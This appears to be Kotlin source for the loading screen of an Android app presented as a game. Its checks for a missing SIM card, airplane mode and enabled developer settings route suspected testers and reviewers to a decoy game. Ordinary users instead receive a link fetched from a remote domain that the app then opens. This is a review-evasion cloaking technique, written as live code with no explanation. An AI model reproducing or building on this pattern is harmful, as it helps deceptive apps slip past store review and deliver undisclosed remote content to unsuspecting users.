package com.kheloyar.livegame.presentation.loading

import android.content.Context
import android.os.Bundle
import android.provider.Settings
import android.telephony.TelephonyManager
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import androidx.navigation.findNavController
import com.kheloyar.livegame.R
import com.kheloyar.livegame.databinding.FragmentSplashKheloyarBinding
import com.kheloyar.livegame.domain.KheloyarUseCase
import com.kheloyar.livegame.presentation.Constants.KHELOYAR_SP
import com.kheloyar.livegame.presentation.Constants.KHELOYAR_URL_SP
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.koin.android.ext.android.inject

class LoadingKheloyarFragment : Fragment() {

    private lateinit var bindingKheloyar: FragmentSplashKheloyarBinding
    private val kheloyarUseCase: KheloyarUseCase by inject()

    override fun onCreateView(
        inflaterKheloyar: LayoutInflater,
        containerKheloyar: ViewGroup?,
        savedInstanceStateKheloyar: Bundle?
    ): View {
        bindingKheloyar =
            FragmentSplashKheloyarBinding.inflate(inflaterKheloyar, containerKheloyar, false)
        if (bindingKheloyar.root.isActivated)
            return bindingKheloyar.root
        if (bindingKheloyar.kheloyarProgressBar.isActivated)
            return bindingKheloyar.root
        if (bindingKheloyar.root.isAttachedToWindow)
            return bindingKheloyar.root
        return bindingKheloyar.root
    }

    override fun onViewCreated(viewKheloyar: View, savedInstanceStateKheloyar: Bundle?) {
        super.onViewCreated(viewKheloyar, savedInstanceStateKheloyar)
        val telephonyManager =
            requireContext().getSystemService(AppCompatActivity.TELEPHONY_SERVICE) as TelephonyManager
        when (telephonyManager.simState) {
            TelephonyManager.SIM_STATE_ABSENT -> {
                nextFragmentKheloyar(true)
            }

            else -> {
                checkAviaKheloyar()
            }
        }
        bindingKheloyar.kheloyarProgressBar.apply {
            max = 100
            progress += 30
        }
    }

    private fun checkAviaKheloyar() {
        if (Settings.System.getInt(
                requireContext().contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0
            ) == 1
        ) nextFragmentKheloyar(true)
        else
            checkDeveloperSettingsKheloyar()
    }

    private fun checkDeveloperSettingsKheloyar() {
        if (Settings.Secure.getInt(
                requireContext().contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            ) == 1
        ) {
            nextFragmentKheloyar(true)
        } else {
            checkURLKheloyar()
        }
    }

    private fun checkURLKheloyar() {
        CoroutineScope(Dispatchers.IO).launch {
            kheloyarUseCase.getLinkForAppKheloyar("https://kheloyar.sbs/pkHFdv36").onSuccess {
                if (it != "") {
                    requireContext().getSharedPreferences(KHELOYAR_SP, Context.MODE_PRIVATE)
                        .edit().putString(
                            KHELOYAR_URL_SP, it
                        ).apply()
                    nextFragmentKheloyar(false)
                } else nextFragmentKheloyar(true)
            }.onFailure {
                nextFragmentKheloyar(true)
            }
        }
    }

    private suspend fun updateProgressKheloyar() {
        withContext(Dispatchers.Main) {
            bindingKheloyar.kheloyarProgressBar.progress += 1
        }
        delay(1)
        delay(1)
        delay(1)
        delay(1)
        delay(1)
        delay(10)
    }

    private fun nextFragmentKheloyar(isGame: Boolean) {
        CoroutineScope(Dispatchers.IO).launch {
            for (i in 1..70) {
                updateProgressKheloyar()
            }
            withContext(Dispatchers.Main) {
                if (isGame) requireView().findNavController()
                    .navigate(R.id.action_splashKheloyarFragment_to_startKheloyarGameFragment)
                else requireView().findNavController()
                    .navigate(R.id.action_splashKheloyarFragment_to_kheloyarFragment)
            }
        }
    }
}